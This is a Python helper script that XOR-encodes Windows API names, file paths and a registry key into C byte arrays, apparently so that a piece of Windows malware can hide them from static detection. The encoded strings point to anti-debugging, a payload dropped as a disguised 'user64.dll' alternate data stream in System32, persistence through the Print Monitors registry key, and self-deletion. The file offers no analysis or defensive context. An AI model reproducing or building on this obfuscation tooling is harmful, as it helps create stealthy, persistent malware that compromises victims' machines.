import os

KEY = "ABCDEFG1234"

def xor(data, key):
    key = str(key)
    l = len(key)
    output_bytes = bytearray()

    for i in range(len(data)):
        current = data[i]
        current_key = key[i % l]
        output_bytes.append(current ^ ord(current_key))
    
    return output_bytes

str_list = [b"CryptAcquireContextW", b"CryptCreateHash", b"CryptHashData", b"CryptDeriveKey", b"CryptDecrypt", b"CryptReleaseContext", b"CryptDestroyHash", b"CryptDestroyKey", b"FreeLibrary", b"ADVAPI32", b"KERNEL32.DLL", b"GetUserNameA", b"GetComputerNameExA", b"GetCurrentDirectoryA", b"IsDebuggerPresent", b"ExitProcess", b"NTDLL", b"NtDelayExecution", b"\\??\\\\C:\\Windows\\System32\\user64.dll:port.dll:$DATA", b"NtCreateFile", b"NtWriteFile", b"SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\\Default", b"user64.dll:port.dll:$DATA", b"Driver", b"C:\\Windows\\System32\\user32.dll", b"C:\\Windows\\System32\\user64.dll", b"\\??\\\\C:\\Windows\\System32\\user64.dll", b"NtDeleteFile"]

print('char xorkey[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in KEY) + ' };')

for s in str_list:
    ciphertext = xor(s + b"\x00", KEY)
    rext = s.decode('utf-8').split('.')[0]
    print('char s' + rext + '[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in ciphertext) + ' };')
